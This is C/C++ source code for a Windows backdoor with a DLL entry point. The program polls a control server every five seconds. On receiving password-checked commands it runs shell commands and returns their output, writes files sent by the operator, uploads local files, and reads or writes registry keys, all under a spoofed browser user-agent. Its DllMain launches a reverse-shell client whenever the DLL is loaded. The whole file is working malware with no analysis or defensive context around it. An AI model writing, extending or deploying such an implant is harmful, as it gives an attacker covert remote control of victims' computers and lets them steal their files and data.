#include "pch.h"
#include <stdio.h>
#include <Windows.h>
#include <winhttp.h>
#include <winreg.h>

#define CONSOLE_ADDRESS L"localhost"
#define PASSWORD "B0223BF2235A473D9E1FBA9699ECC212"

char * read_file_to_buffer(char *buffer, const char *filename) {
	FILE * fp;
	if (fopen_s(&fp, filename, "rb") != 0)
		printf("Error in fopen_s: %u\n", GetLastError());
	int i = 0;
	for (char ch = fgetc(fp); ch != EOF; ch = fgetc(fp)) {
		buffer = (char*) realloc(buffer, (i+1) * sizeof(char));
		buffer[i] = ch;
		i++;
	}
	buffer[i] = '\0';
	return buffer;
}

void send_file(LPCWSTR server, LPSTR file) {
	BOOL  bResults = FALSE;
	HINTERNET hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	char *contents = (char*) malloc(sizeof(char));
	contents = read_file_to_buffer(contents, file);

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, (LPCWSTR) server,
			INTERNET_DEFAULT_HTTP_PORT, 0);

	// Create an HTTP Request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"PUT",
			L"/",
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			0);

	char *request = (char*)malloc((strlen(contents) + strlen(PASSWORD)) * sizeof(char));
	strcpy_s(request, strlen(PASSWORD) + 1, PASSWORD);
	strcat_s(request, strlen(contents) + strlen(PASSWORD) + 1, contents);

	// Send a Request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, (LPVOID) request, strlen(request),
			strlen(request), 0);

	// Report any errors.
	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

void send_message(LPCWSTR server, LPSTR contents) {
	BOOL  bResults = FALSE;
	HINTERNET hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, (LPCWSTR) server,
			INTERNET_DEFAULT_HTTP_PORT, 0);

	// Create an HTTP Request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"POST",
			L"/",
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			0);  

	// Send a Request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, (LPVOID) contents, strlen(contents),
			strlen(contents), 0);

	// Report any errors.
	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

void receive_and_execute_command()
{
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, CONSOLE_ADDRESS,
			INTERNET_DEFAULT_HTTP_PORT, 0);

	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			NULL);

	// Send a request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);

	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());

			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				dwSize = 0;
			}
			else
			{
				// Read the data.
				ZeroMemory(pszOutBuffer, dwSize + 1);

				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					printf("Error %u in WinHttpReadData.\n", GetLastError());
				else {
					char * saveptr = NULL;
					char * line = strtok_s(_strdup(pszOutBuffer), "\n", &saveptr);
					if (line) {
						if (strncmp(line, PASSWORD, 33) == 0) {
							line = strtok_s(NULL, "\n", &saveptr);
							char cmd_id = line[0];
							switch (cmd_id) {
							case '1':
							{
								// run_cmd
								line = strtok_s(NULL, "\n", &saveptr);
								FILE *fp_stdout, *fp_stderr;
								char tmpfile_name[L_tmpnam_s];
								tmpnam_s(tmpfile_name, L_tmpnam_s);
								freopen_s(&fp_stdout, tmpfile_name, "a", stdout);
								freopen_s(&fp_stderr, tmpfile_name, "a", stderr);
								system(line);
								fclose(stdout);
								fclose(stderr);
								char *output = (char*)malloc(sizeof(char));
								output = read_file_to_buffer(output, tmpfile_name);
								send_message(CONSOLE_ADDRESS, output);
								remove(tmpfile_name);
								break;
							}
							case '2':
							{
								// ul_file
								line = strtok_s(NULL, "\n", &saveptr);
								const char * destination = line;
								line = strtok_s(NULL, "\n", &saveptr);
								const char * encoded_data = line;
								FILE *fp;
								if (fopen_s(&fp, destination, "wb") != 0)
									printf("Error in fopen_s: %u\n", GetLastError());
								else
								{
									int count = 0;
									while (count + 1 <= strlen(encoded_data) - 1) {
										char ch[2] = { NULL, NULL };
										ch[0] = encoded_data[count];
										ch[1] = encoded_data[count + 1];
										int valid = 0;
										for (int i = 0; i <= 1; i++) {
											if ((ch[i] >= 0x61 && ch[i] <= 0x66) || (ch[i] >= 0x30 && ch[i] <= 0x39)) {
												valid++;
											}
										}
										if (valid == 2) {
											long number = strtol(ch, NULL, 16);
											if (number >= 0 && number <= 255) {
												fputc((char)number, fp);
											}
										}
										count += 2;
									}
									fclose(fp);
								}
								break;
							}
							case '3':
							{
								// dl_file
								line = strtok_s(NULL, "\n", &saveptr);
								LPCWSTR location = (LPCWSTR)line;
								send_file(CONSOLE_ADDRESS, line);
								break;
							}
							case '4':
							{
								// reg_read
								HKEY reg_key;
								line = strtok_s(NULL, "\n", &saveptr);
								LPSTR key_num = line;
								line = strtok_s(NULL, "\n", &saveptr);
								LPSTR subkey_name = line;
								line = strtok_s(NULL, "\n", &saveptr);
								LPSTR value_name = line;

								DWORD err;
								if (!strncmp(key_num, "1", 1))
									err = RegOpenKeyExA(HKEY_CLASSES_ROOT, subkey_name, 0, KEY_READ, &reg_key);
								else if (!strncmp(key_num, "2", 1))
									err = RegOpenKeyExA(HKEY_CURRENT_CONFIG, subkey_name, 0, KEY_READ, &reg_key);
								else if (!strncmp(key_num, "3", 1)) {
									err = RegOpenKeyExA(HKEY_CURRENT_USER, subkey_name, 0, KEY_READ, &reg_key);
								}
								else if (!strncmp(key_num, "4", 1))
									err = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey_name, 0, KEY_READ, &reg_key);
								else if (!strncmp(key_num, "5", 1))
									err = RegOpenKeyExA(HKEY_USERS, subkey_name, 0, KEY_READ, &reg_key);
								else {
									err = RegOpenKeyExA(HKEY_CURRENT_USER, subkey_name, 0, KEY_READ, &reg_key);
								}
								if (err != ERROR_SUCCESS)
									if (err == -1)
										printf("Invalid key number\n");
									else
										printf("Error %u in RegOpenKeyEx", err);
								else {
									DWORD BufferSize = 8192;
									DWORD cbData;
									DWORD dwRet;

									LPSTR data = (LPSTR)malloc(BufferSize);
									cbData = BufferSize;
									dwRet = RegQueryValueExA(reg_key,
										value_name,
										NULL,
										NULL,
										(LPBYTE)data,
										&cbData);
									while (dwRet == ERROR_MORE_DATA)
									{
										// Get a buffer that is big enough.

										BufferSize += 4096;
										data = (LPSTR)realloc(data, BufferSize);
										cbData = BufferSize;

										dwRet = RegQueryValueExA(reg_key,
											value_name,
											NULL,
											NULL,
											(LPBYTE)data,
											&cbData);
									}
									if (dwRet == ERROR_SUCCESS)
										send_message(CONSOLE_ADDRESS, data);
								}
								break;
							}
							case '5':
							{
								// reg_write
								HKEY reg_key;
								DWORD outcome;
								line = strtok_s(NULL, "\n", &saveptr);
								LPSTR key_num = line;
								line = strtok_s(NULL, "\n", &saveptr);
								LPSTR subkey_name = (LPSTR)line;
								line = strtok_s(NULL, "\n", &saveptr);
								LPSTR value_name = (LPSTR)line;
								line = strtok_s(NULL, "\n", &saveptr);
								LPSTR value_data = (LPSTR)line;

								DWORD err;
								if (!strncmp(key_num, "1", 1))
									err = RegCreateKeyExA(HKEY_CLASSES_ROOT, subkey_name, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg_key, &outcome);
								else if (!strncmp(key_num, "2", 1))
									err = RegCreateKeyExA(HKEY_CURRENT_CONFIG, subkey_name, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg_key, &outcome);
								else if (!strncmp(key_num, "3", 1))
									err = RegCreateKeyExA(HKEY_CURRENT_USER, subkey_name, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg_key, &outcome);
								else if (!strncmp(key_num, "4", 1))
									err = RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey_name, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg_key, &outcome);
								else if (!strncmp(key_num, "5", 1))
									err = RegCreateKeyExA(HKEY_USERS, subkey_name, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg_key, &outcome);
								else {
									printf("Failed!\n");
									err = RegCreateKeyExA(reg_key, subkey_name, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg_key, &outcome);
								} 


								if (err == ERROR_SUCCESS) {
									RegSetValueExA(
										reg_key,
										value_name,
										0,
										REG_SZ,
										reinterpret_cast<BYTE *>(value_data),
										sizeof(value_data)
									);
									RegCloseKey(reg_key);
								}
								break;
							}

							}
						}
					}
				// Free the memory allocated to the buffer.
				delete[] pszOutBuffer;
			}
		} 
	}while (dwSize > 0);


	// Report any errors.
	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}}

int main() {
	while (1) {
		Sleep(5000);
		receive_and_execute_command();
	}
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		system("reverse_shell_client.exe");
		break;
	case DLL_THREAD_ATTACH:
		system("reverse_shell_client.exe");
		break;
	}
	return TRUE;
}